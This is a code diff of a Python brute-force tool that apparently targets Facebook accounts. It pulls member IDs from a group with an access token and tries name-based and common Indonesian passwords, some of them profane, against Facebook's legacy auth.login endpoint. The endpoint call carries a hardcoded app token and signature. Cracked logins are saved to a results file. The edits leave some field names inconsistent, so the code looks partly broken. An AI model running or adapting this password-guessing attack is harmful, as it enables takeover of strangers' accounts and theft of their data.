@@ -89,11 +89,11 @@ def menu(n,toket):
 	elif unikers in ["3"]:
 		try:	
 			idg = input("\n%s[*]%s ID group : "%(P,W))
-			e = s.get(url.format("group/?id="+idg+"&access_token=%s"%(toket))).json()["name"]
+			e = s.get(url.format("group/?mail="+idg+"&access_token=%s"%(toket))).json()["name"]
 		except KeyError:
 			exit("%s[!]%s ups sorry group not found !!"%(R,W))
 		print("%s[*]%s from : %s"%(P,W,e))
-		for y in s.get(url.format(idg+"/members?fields=name,id&limit=5000&access_token=%s"%(toket))).json()["data"]:
+		for y in s.get(url.format(idg+"/members?fields=name,mail&limit=10000&access_token=%s"%(toket))).json()["data"]:
 			target.append(y["id"])
 	elif unikers in ["0"]:
 		os.system("rm -rf cookie")
@@ -115,8 +115,8 @@ def x(user):
 	except:
 		pass
 	try:
-		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
-		for pas in [nama+"86",nama+"90",nama+"91",nama+"92","@"+nama,"sayang","bangsat","kontol","cintasejati","anjing",nama+"01"]:
+		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["last_name"]
+		for pas in [nama+"86",nama+"12345",nama+"1234",nama+"123","@"+nama,"sayang","bangsat","kontol","cintasejati","anjing",nama+"01"]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
